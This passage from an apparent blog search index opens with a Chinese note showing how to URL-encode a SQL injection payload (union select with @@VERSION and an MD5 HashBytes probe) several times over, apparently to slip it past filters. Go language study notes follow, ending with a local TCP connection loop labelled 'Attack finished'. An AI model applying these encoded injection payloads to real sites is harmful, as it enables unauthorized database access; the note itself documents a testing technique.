1%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%39%25%32%35%25%33%37%25%33%33%25%32%35%25%33%32%25%36%35%25%32%35%25%33%36%25%33%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%35%25%36%36%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%31%25%32%35%25%33%36%25%36%33%25%32%35%25%33%37%25%33%36%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%32%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%37%25%33%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%34%25%33%38%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%38%25%32%35%25%33%34%25%33%32%25%32%35%25%33%37%25%33%39%25%32%35%25%33%37%25%33%34%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%32%25%33%38%25%32%35%25%33%32%25%33%37%25%32%35%25%33%34%25%36%34%25%32%35%25%33%34%25%33%34%25%32%35%25%33%33%25%33%35%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%33%31%25%32%35%25%33%33%25%33%32%25%32%35%25%33%33%25%33%33%25%32%35%25%33%33%25%33%34%25%32%35%25%33%33%25%33%35%25%32%35%25%33%33%25%33%36%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%33%31 解码一次 1%25%33%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%36%25%36%65%25%35%66%25%37%33%25%37%31%25%36%63%25%37%36%25%36%31%25%37%32%25%36%32%25%36%31%25%37%33%25%36%35%25%37%34%25%36%66%25%37%33%25%37%34%25%37%32%25%32%38%25%34%38%25%36%31%25%37%33%25%36%38%25%34%32%25%37%39%25%37%34%25%36%35%25%37%33%25%32%38%25%32%37%25%34%64%25%34%34%25%33%35%25%32%37%25%32%63%25%32%37%25%33%31%25%33%32%25%33%33%25%33%34%25%33%35%25%33%36%25%32%37%25%32%39%25%32%39%25%32%39%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%37%25%33%31 解码两次 1%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%28%73%65%6c%65%63%74%20%73%79%73%2e%66%6e%5f%73%71%6c%76%61%72%62%61%73%65%74%6f%73%74%72%28%48%61%73%68%42%79%74%65%73%28%27%4d%44%35%27%2c%27%31%32%33%34%35%36%27%29%29%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%27%31 解码三次 11&#x27; union select 1%2c(select sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;%2c&#x27;123456&#x27;))) union select 1%2c&#x27;1 原始payload 11&#x27; union select 1,(select sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;123456&#x27;))) union select 1,&#x27;1 正向编码实例注意！每一次编码过后，原本的特殊字符编码，不要再次编码，比如,是%2c，不要对他进行重复编码。 原始 payload 11&#x27; union select 1,(select @@VERSION) union select 1,&#x27;1 对特殊字符进行编码 11&#x27; union select 1%2c(select %40%40VERSION) union select 1%2c&#x27;1 第一次编码 hex之后，在前面加百分号，正则匹配【find：(..) replace：%\\1】 注意，%2c %40不编码 1%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%28%73%65%6c%65%63%74%20%40%40%56%45%52%53%49%4f%4e%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%27%31 第二次编码 直接把上面那段，放进hex之后，加%就可以 16进制转换，16进制转换文本字符串，在线16进制转换 | 在线工具 (sojson.com) 1%25%33%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%35%36%25%34%35%25%35%32%25%35%33%25%34%39%25%34%66%25%34%65%25%32%39%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%32%37%25%33%31 第三次编码 丢进hex 1%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%34%25%33%30%25%32%35%25%33%35%25%33%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%32%25%32%35%25%33%35%25%33%33%25%32%35%25%33%34%25%33%39%25%32%35%25%33%34%25%36%36%25%32%35%25%33%34%25%36%35%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%33%25%33%31","categories":[{"name":"写 exp 遇到的问题","slug":"写-exp-遇到的问题","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"URL","slug":"URL","permalink":"https://gryffinbit.top/tags/URL/"}],"author":"Gryffinbit"},{"title":"Mac上遇到的环境问题记录","slug":"Mac上遇到的环境问题记录","date":"2023-07-14T18:03:58.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/07/15/Mac上遇到的环境问题记录/","permalink":"https://gryffinbit.top/2023/07/15/Mac%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Goland设置代理","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"Goland","slug":"Goland","permalink":"https://gryffinbit.top/tags/Goland/"},{"name":"Golang","slug":"Golang","permalink":"https://gryffinbit.top/tags/Golang/"}],"author":"Gryffinbit"},{"title":"Go语言学习记录","slug":"Go语言学习记录","date":"2023-07-14T11:24:15.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2023/07/14/Go语言学习记录/","permalink":"https://gryffinbit.top/2023/07/14/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"Go 语言结构 包声明 引入包 函数 变量 语句&amp;表达式 注释 可以通过go run指令，直接运行.go文件。 可以通过go build指令，生成二进制文件。 Go中，&#123;不能单独一行 Go基础语法标识符标识符用来命名变量、类型等程序实体。一个标识符实际上就是一个或是多个字母(AZ和az)数字(0~9)、下划线_组成的序列，但是第一个字符必须是字母或下划线而不能是数字。 并且不能使用关键字命名。 以下是有效的标识符： 1a_123 _temp j 以下是无效的标识符： 1ab（以数字开头） case（Go 语言的关键字） a+b（运算符是不允许的） 关键字 字符串连接用加号直接连接 12345package mainimport &quot;fmt&quot;func main()&#123; fmt.Println(&quot;Gryffinbit&quot;+&quot;awesome&quot;)&#125; 格式化字符串Go 语言中使用 fmt.Sprintf 或 fmt.Printf 格式化字符串并赋值给新串： Sprintf 根据格式化参数生成格式化的字符串并返回该字符串。 Printf 根据格式化参数生成格式化的字符串并写入标准输出。 Sprintf 实例 有一种“填入”的感觉，把已经有了的变量，填入到%d、%s中去。但想要显示出返回结果的时候不能直接用，他不能自己去“显示结果”，需要借助print函数才可以打印出来 Printf实例 能够像Sprintf一样，返回字符串（填入的感觉），并且可以直接调用来打印出结果，显示出来。即可以写入输出 Go语言数据类型 Go语言变量变量声明 指定变量类型，如果没有初始化，则变量默认为零值。 1var v_name v_type 12345678910111213141516package mainimport &quot;fmt&quot;func main() &#123; // 声明一个变量并初始化 var a = &quot;RUNOOB&quot; fmt.Println(a) // 没有初始化就为零值 var b int fmt.Println(b) // bool 零值为 false var c bool fmt.Println(c)&#125; 以下类型为nil 123456var a *intvar a []intvar a map[string] intvar a chan intvar a func(string) intvar a error // error 是接口 根据值，自行判断变量类型 1var v_name = value 不能用:=重复声明变量 正确的使用： 1v_name := value 非正确的使用（重复声明）： 12var v_name intv_name := 1 多变量声明1. 使用指定变量的方式 12var v_name1,v_name2,v_name3 typev_name1,v_name2,v_name3 = v1, v2,v3 2. 使用自动推断的方法 1var v_name1,v_name2,v_name3 = v1,v2,v3 3. :=声明变量 1v_name1,v_name2,v_name2 := v1,v2,v3 4. 全局变量的声明 12345var ( v_name1 type v_name2 type) 空白标识符空白标识符 _ 也被用于抛弃值，如值 5 在_, b = 5, 7 中被抛弃。 _ 实际上是一个只写变量，你不能得到它的值。这样做是因为 Go 语言中你必须使用所有被声明的变量，但有时你并不需要使用从一个函数得到的所有返回值。 Go语言常量使用const关键字进行创建。 同样使用上述的两种声明类型，显式声明类型和隐式声明类型。 特殊常量：iota 可以认为式一个可以被编译器修改的常量。 iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。 第一个iota等于0，每当iota在新的一行被使用的时候，值会自动加一。 也就是说，iota实际上是在计算const出现的次数，不会受常量本身值的影响，而是直接计算。 同时，调用iota进行计算之后，对于后续没有赋值的常量，会对iota进行累加，然后重复计算。 算数运算符：常规算数运算符，和关系运算符，以及逻辑运算符，位运算符。 赋值运算符：go的赋值运算符比较多： GO条件语句：If else语句： 和Python差不多。 1234567891011121314package mainimport &quot;fmt&quot;func main() &#123; var age int = 23 if age == 25 &#123; fmt.Println(&quot;true&quot;) &#125; else if age &lt; 25 &#123; fmt.Println(&quot;too small&quot;) &#125; else &#123; fmt.Println(&quot;too big&quot;) &#125;&#125; 但是可以不写:号，需要花括号，直接写布尔判断语句。 switch语句： 类似于C语言，同时支持多条件匹配，default语句不管写在什么地方，都是默认最后执行的。 12345678910111213141516171819202122232425262728package mainimport &quot;fmt&quot;func main() &#123; var x interface&#123;&#125; switch i := x.(type) &#123; case nil: fmt.Printf(&quot; x 的类型 :%T&quot;,i) fallthrough //使用fallthrough语句，会强制执行下一条case，不会判断是否可以执行。 case int: fmt.Printf(&quot;x 是 int 型&quot;) case float64: fmt.Printf(&quot;x 是 float64 型&quot;) case func(int) float64: fmt.Printf(&quot;x 是 func(int) 型&quot;) case bool, string: fmt.Printf(&quot;x 是 bool 或 string 型&quot; ) default: fmt.Printf(&quot;未知型&quot;) &#125; //多条件执行 switch&#123; case 1,2,3,4: default: &#125;&#125; select语句： select 是 Go 中的一个控制结构，类似于 switch 语句。 select 语句只能用于通道操作，每个 case 必须是一个通道操作，要么是发送要么是接收。 select 语句会监听所有指定的通道上的操作，一旦其中一个通道准备好就会执行相应的代码块。 如果多个通道都准备好，那么 select 语句会随机选择一个通道执行。如果所有通道都没有准备好，那么执行 default 块中的代码。 123456789101112131415161718192021222324package mainimport &quot;fmt&quot;func main() &#123; var c1, c2, c3 chan int var i1, i2 int select &#123; case i1 = &lt;-c1: fmt.Printf(&quot;received &quot;, i1, &quot; from c1\\n&quot;) case c2 &lt;- i2: fmt.Printf(&quot;sent &quot;, i2, &quot; to c2\\n&quot;) case i3, ok := (&lt;-c3): // same as: i3, ok := &lt;-c3 if ok &#123; fmt.Printf(&quot;received &quot;, i3, &quot; from c3\\n&quot;) &#125; else &#123; fmt.Printf(&quot;c3 is closed\\n&quot;) &#125; default: fmt.Printf(&quot;no communication\\n&quot;) &#125; &#125;//输出：no communication 需要多了解一下channel类型： eg: 12345678910111213141516171819202122232425262728293031package mainimport ( &quot;fmt&quot; &quot;time&quot;)func main() &#123; c1 := make(chan string) c2 := make(chan string) go func() &#123; time.Sleep(1 * time.Second) c1 &lt;- &quot;one&quot; &#125;() go func() &#123; time.Sleep(2 * time.Second) c2 &lt;- &quot;two&quot; &#125;() for i := 0; i &lt; 2; i++ &#123; select &#123; case msg1 := &lt;-c1: fmt.Println(&quot;received&quot;, msg1) case msg2 := &lt;-c2: fmt.Println(&quot;received&quot;, msg2) &#125; &#125;&#125; channel，顾名思义，就是一个通道，效果像是一个水管，可以通过&lt;-将某个值传递到通道里。 使用make函数，创建两个通道。 创建异步运行的函数： 通过&lt;-符号，将string值传递给通道c1。 当通道c1接收到值的时候，就会被select检测到，然后把c1里面的值流出来，通过短声明赋值给msg1然后，输出。 如果没有任何消息，就直接执行default的子语句。 如果没有default，就直接卡住，直到可以执行为止。 GO循环语句：For 使用for语句和布尔表达式进行循环。没有while。 123456789101112131415s := &quot;abc&quot;for i, n := 0, len(s); i &lt; n; i++ &#123; // 常见的 for 循环，支持初始化语句。 println(s[i])&#125;n := len(s)for n &gt; 0 &#123; // 替代 while (n &gt; 0) &#123;&#125; println(s[n]) // 替代 for (; n &gt; 0;) &#123;&#125; n-- &#125;for &#123; // 替代 while (true) &#123;&#125; println(s) // 替代 for (;;) &#123;&#125;&#125; for &#123;&#125;|for (;;)&#123;&#125;和 while true 一个意思。 死循环通过直接写布尔式，达成死循环： 具体布尔值格式： 123for init;condition;post &#123;&#125; init： 一般为赋值表达式，给控制变量赋初值；condition： 关系表达式或逻辑表达式，循环控制条件；post： 一般为赋值表达式，给控制变量增量或减量。for语句执行过程如下： ① 先对表达式 init 赋初值； ② 判别赋值表达式 init 是否满足给定 condition 条件，若其值为真，满足循环条件，则执行循环体内语句，然后执行 post，进入第二次循环，再判别 condition；否则判断 condition 的值为假，不满足条件，就终止for循环，执行循环体外语句。 通过range格式的关键字，达成foreach()效果； 1234for key, value := range oldMap &#123; newMap[key] = value&#125; rangerange 用于遍历数组或者字典。 123456789101112131415161718192021func main() &#123; s := &quot;abc&quot; // 忽略 2nd value，支持 string/array/slice/map。 for i := range s &#123; println(s[i]) &#125; // 忽略 index。 for _, c := range s &#123; println(c) &#125; // 忽略全部返回值，仅迭代。 for range s &#123; &#125; m := map[string]int&#123;&quot;a&quot;: 1, &quot;b&quot;: 2&#125; // 返回 (key, value)。 for k, v := range m &#123; println(k, v) &#125;&#125; goto、continue、breakgoto 和 C 一样，跳回到指定的 label 里 1234567891011func main() &#123; i := 0loop: fmt.Println(i) i++ if i &lt; 10 &#123; goto loop &#125;&#125; break 和 continue 和其他语言的一样 123456789func main() &#123; for i := 0; i &lt; 10; i++ &#123; if i%2 == 0 &#123; continue &#125; fmt.Println(i) &#125;&#125; GO函数：函数定义 函数声明包含一个函数名，参数列表， 返回值列表和函数体。如果函数没有返回值，则返回列表可以省略。函数从第一条语句开始执行，直到执行 return 语句或者执行函数的最后一条语句。 函数可以没有参数或接受多个参数。 注意类型在变量名之后 。 当两个或多个连续的函数命名参数是同一类型，则除了最后一个类型之外，其他都可以省略。 函数可以返回任意数量的返回值。 类型相同的相邻参数，参数类型可合并。 多返回值必须用括号。 12345func test(x, y int, s string) (int, string) &#123; //这里的 x，y 都是 int 型。 n := x + y return n, fmt.Sprintf(s, n)&#125; 声明方式： 123456789func function_name( [parameter list] ) [return_types] &#123; 函数体&#125;/*func test(a,b,c int) int&#123; return 123123&#125;/* 如果没有返回值就不写返回类型，注意形参也要写类型： 如果会返回多个值： 闭包闭包是由函数及其相关引用环境组合而成的实体（即：闭包&#x3D;函数+引用环境）。 123456789101112131415161718192021222324package mainimport ( &quot;fmt&quot;)func a() func() int &#123; i := 0 b := func() int &#123; i++ fmt.Println(i) return i &#125; return b&#125;func main() &#123; c := a() c() c() c() a() //不会输出i&#125; 递归123456789101112131415package mainimport &quot;fmt&quot;func factorial(i int) int &#123; if i &lt;= 1 &#123; return 1 &#125; return i * factorial(i-1)&#125;func main() &#123; var i int = 7 fmt.Printf(&quot;Factorial of %d is %d\\n&quot;, i, factorial(i))&#125; 输出结果就是 7 的阶乘 延时调用 defer 关键字 defer 用于注册延迟调用。 这些调用直到 return 前才被执行。因此，可以用来做资源清理。 多个defer语句，按先进后出的方式执行。 defer语句中的变量，在defer声明时就决定了。 用途： 关闭文件句柄 锁资源释放 数据库连接释放 defer 定义的东西遵循先进后出 12345678910package mainimport &quot;fmt&quot;func main() &#123; var whatever [5]struct&#123;&#125; for i := range whatever &#123; defer func() &#123; fmt.Println(i) &#125;() &#125;&#125; 输出顺序是4 3 2 1 异常处理异常panic： 内置函数 假如函数F中，书写了panic语句，会终止其后要执行的代码，在panic所在函数F内如果存在要执行的defer函数列表，按照defer的逆序执行 返回函数F的调用者G，在G中，调用函数F语句之后的代码不会执行，假如函数G中存在要执行的defer函数列表，按照defer的逆序执行 直到goroutine整个退出，并报告错误 recover： 内置函数 用来控制一个goroutine的panicking行为，捕获panic，从而影响应用的行为 一般的调用建议 在defer函数中，通过recover来终止一个goroutine的panicking过程，从而恢复正常代码的执行 可以获取通过panic传递的error 123456789101112131415package mainfunc main() &#123; test()&#125;func test() &#123; defer func() &#123; if err := recover(); err != nil &#123; println(err.(string)) // 将 interface&#123;&#125; 转型为具体类型。 &#125; &#125;() panic(&quot;panic error!&quot;)&#125; 延迟调用中引发的错误，可被后续延迟调用捕获，但仅最后一个错误可被捕获。 12345678910111213141516171819package mainimport &quot;fmt&quot;func test() &#123; defer func() &#123; fmt.Println(recover()) &#125;() defer func() &#123; panic(&quot;defer panic&quot;) &#125;() panic(&quot;test panic&quot;)&#125;func main() &#123; test()&#125; 自定义error1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;time&quot;)type PathError struct &#123; path string op string createTime string message string&#125;func (p *PathError) Error() string &#123; return fmt.Sprintf(&quot;path=%s \\nop=%s \\ncreateTime=%s \\nmessage=%s&quot;, p.path, p.op, p.createTime, p.message)&#125;func Open(filename string) error &#123; file, err := os.Open(filename) if err != nil &#123; return &amp;PathError&#123; path: filename, op: &quot;read&quot;, message: err.Error(), createTime: fmt.Sprintf(&quot;%v&quot;, time.Now()), &#125; &#125; defer file.Close() return nil&#125;func main() &#123; err := Open(&quot;test.txt&quot;) switch v := err.(type) &#123; case *PathError: fmt.Println(&quot;get path error,&quot;, v) default: &#125;&#125; 方法Golang 里的方法总是绑定对象，也就是对象.方法()这样调用 123func (recevier type) methodName(参数列表)(返回值列表)&#123;&#125; //参数和返回值可以省略 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package maintype Test struct&#123;&#125;// 无参数、无返回值func (t Test) method0() &#123;&#125;// 单参数、无返回值func (t Test) method1(i int) &#123;&#125;// 多参数、无返回值func (t Test) method2(x, y int) &#123;&#125;// 无参数、单返回值func (t Test) method3() (i int) &#123; return&#125;// 多参数、多返回值func (t Test) method4(x, y int) (z int, err error) &#123; return&#125;// 无参数、无返回值func (t *Test) method5() &#123;&#125;// 单参数、无返回值func (t *Test) method6(i int) &#123;&#125;// 多参数、无返回值func (t *Test) method7(x, y int) &#123;&#125;// 无参数、单返回值func (t *Test) method8() (i int) &#123; return&#125;// 多参数、多返回值func (t *Test) method9(x, y int) (z int, err error) &#123; return&#125;func main() &#123;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package main//普通函数与方法的区别（在接收者分别为值类型和指针类型的时候）import ( &quot;fmt&quot;)//1.普通函数//接收值类型参数的函数func valueIntTest(a int) int &#123; return a + 10&#125;//接收指针类型参数的函数func pointerIntTest(a *int) int &#123; return *a + 10&#125;func structTestValue() &#123; a := 2 fmt.Println(&quot;valueIntTest:&quot;, valueIntTest(a)) //函数的参数为值类型，则不能直接将指针作为参数传递 //fmt.Println(&quot;valueIntTest:&quot;, valueIntTest(&amp;a)) //compile error: cannot use &amp;a (type *int) as type int in function argument b := 5 fmt.Println(&quot;pointerIntTest:&quot;, pointerIntTest(&amp;b)) //同样，当函数的参数为指针类型时，也不能直接将值类型作为参数传递 //fmt.Println(&quot;pointerIntTest:&quot;, pointerIntTest(&amp;b)) //compile error:cannot use b (type int) as type *int in function argument&#125;//2.方法type PersonD struct &#123; id int name string&#125;//接收者为值类型func (p PersonD) valueShowName() &#123; fmt.Println(p.name)&#125;//接收者为指针类型func (p *PersonD) pointShowName() &#123; fmt.Println(p.name)&#125;func structTestFunc() &#123; //值类型调用方法 personValue := PersonD&#123;101, &quot;hello world&quot;&#125; personValue.valueShowName() personValue.pointShowName() //指针类型调用方法 personPointer := &amp;PersonD&#123;102, &quot;hello golang&quot;&#125; personPointer.valueShowName() personPointer.pointShowName() //与普通函数不同，接收者为指针类型和值类型的方法，指针类型和值类型的变量均可相互调用&#125;func main() &#123; structTestValue() structTestFunc()&#125; GO语言数组：声明方法： 1var variable_name [size] type 也就是： 1var balance [10] float32 二维数组： 1var variable_name [SIZE1][SIZE2]...[SIZEN] variable_type 也就是C语言的二位数组声明方法，没什么变化。 数组初始化：12345//第一种var balance = [5]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;//第二种，短声明balance := [5]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125; 不确定数组长度，使用...来进行指代。 可以单独初始化某个元素： 1初始化为2.0，3初始化为7.0 GO指针：声明指针格式： 1var var_name *var-type 同样还是使用&amp;作为取地址符。 当Go指针被定义之后，没有分配到任何变量的时候，值为nil，称为空指针。 GO结构体：声明结构体方式： 123456type struct_variable_type struct &#123; member definition member definition ... member definition&#125; 声明结构体变量： 123variable_name := structure_variable_type &#123;value1, value2...valuen&#125;或variable_name := structure_variable_type &#123; key1: value1, key2: value2..., keyn: valuen&#125; 同时包含内部变量赋值，如果没有进行复制的字段，就是空值，或是0。 访问结构体内部对象，使用 1结构体.成员名&quot; 结构体指针你可以定义指向结构体的指针类似于其他指针变量，格式如下： 1var struct_pointer *Books GO切片：切片是对数组的一个连续片段的引用，所以切片是一个引用类型，这个片段可以是整个数组，也可以是由起始和终止索引标识的一些项的子集。 通过声明一个未指定大小的数组来定义切片： 1var identifier []type 或是使用**make()**函数来创建切片： 12345var slice1 []type = make([]type, len)也可以简写为slice1 := make([]type, len) 也可以指定容量，其中capacity是可选参数。也就是指定切片最多能切多大。 1make([]T, length, capacity) 这里len是数组的长度，并且也是切片的初始长度。 切片初始化： 1s :=[] int &#123;1,2,3 &#125; []标识切片类型。 切一个数组： 123s := arr[startIndex:endIndex] //引用某个数组s := arr[:] len()和cap()函数：切片是可以索引的，并且可以由len()方法获取长度。 切片提供了计算容量的方法，cap()可以测量切片长度最长可以得到多少 增加切片内容：使用append()函数 向切片中追加一个新元素，用于添加一个新元素。 123456789101112 /* 允许追加空切片 */numbers = append(numbers, 0)printSlice(numbers) /* 向切片添加一个元素 */numbers = append(numbers, 1)printSlice(numbers) /* 同时添加多个元素 */numbers = append(numbers, 2,3,4)printSlice(numbers) 使用copy()函数 拷贝切片，但是是从后拷贝到前： 123/* 拷贝 numbers 的内容到 numbers1 */ copy(numbers1,numbers) printSlice(numbers1) GO范围：实际上就是Pythonh中的range函数。 GO语言Map：一种无序的键值对集合，实际上应该和Java中的map是差不多的，一种基于Hash计算的集合。 类型转换：类型转换格式： 1type_name(expression) ？，转换方式是反的，相当于调用了一个函数去处理。 GO接口：Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。 接口可以让我们将不同的类型绑定到一组公共的方法上，从而实现多态和灵活的设计。 Go 语言中的接口是隐式实现的，也就是说，如果一个类型实现了一个接口定义的所有方法，那么它就自动地实现了该接口。因此，我们可以通过将接口作为参数来实现对不同类型的调用，从而实现多态。 声明一个接口： 12345678910111213141516171819202122/* 定义接口 */type interface_name interface &#123; method_name1 [return_type] method_name2 [return_type] method_name3 [return_type] ... method_namen [return_type]&#125;/* 定义结构体 */type struct_name struct &#123; /* variables */&#125;/* 实现接口方法 */func (struct_name_variable struct_name) method_name1() [return_type] &#123; /* 方法实现 */&#125;...func (struct_name_variable struct_name) method_namen() [return_type] &#123; /* 方法实现*/&#125; 实例： 12345678910111213141516171819202122232425262728293031323334package mainimport ( &quot;fmt&quot;)type Phone interface &#123; call()&#125;type NokiaPhone struct &#123;&#125;func (nokiaPhone NokiaPhone) call() &#123; fmt.Println(&quot;I am Nokia, I can call you!&quot;)&#125;type IPhone struct &#123;&#125;func (iPhone IPhone) call() &#123; fmt.Println(&quot;I am iPhone, I can call you!&quot;)&#125;func main() &#123; var phone Phone phone = new(NokiaPhone) phone.call() phone = new(IPhone) phone.call()&#125; 逻辑： 创建一个interface，然后声明对应的变量。 然后传入对应的参数，在interface中，会统一调用所有的函数，根据参数来选择。用于调用的函数写法比较特殊： 123func (variable_name) func_name return_type&#123;&#125; 用go写一个发包程序UDP1234567891011121314151617181920212223242526272829303132package mainimport ( &quot;fmt&quot; &quot;net&quot;)func main() &#123; // 创建一个 UDP 地址 addr, err := net.ResolveUDPAddr(&quot;udp&quot;, &quot;127.0.0.1:8080&quot;) if err != nil &#123; fmt.Println(err) return &#125; // 创建一个 UDP 连接 conn, err := net.DialUDP(&quot;udp&quot;, nil, addr) if err != nil &#123; fmt.Println(err) return &#125; defer conn.Close() // 关闭连接 // 准备要发送的数据 data := []byte(&quot;Hello, this is a UDP packet&quot;) // 发送数据 n, err := conn.Write(data) if err != nil &#123; fmt.Println(err) return &#125; fmt.Printf(&quot;Sent %d bytes\\n&quot;, n)&#125; 运行结果： 使用tcpdump检验是否收到包 TCP123456789101112131415161718192021222324252627282930313233package mainimport ( &quot;fmt&quot; &quot;net&quot; &quot;sync&quot;)func main() &#123; target := &quot;127.0.0.1:8080&quot; // 目标地址 n := 100 // 发送次数 var wg sync.WaitGroup // 同步等待组 for i := 0; i &lt; n; i++ &#123; wg.Add(1) // 增加等待计数 go func() &#123; defer wg.Done() // 减少等待计数 conn, err := net.Dial(&quot;tcp&quot;, target) // 创建TCP连接 if err != nil &#123; fmt.Println(err) // 处理错误 return &#125; defer conn.Close() // 延迟关闭连接 _, err = conn.Write([]byte(&quot;Hello&quot;)) // 发送数据包 if err != nil &#123; fmt.Println(err) // 处理错误 return &#125; &#125;() &#125; wg.Wait() // 等待所有goroutine完成 fmt.Println(&quot;Attack finished&quot;) // 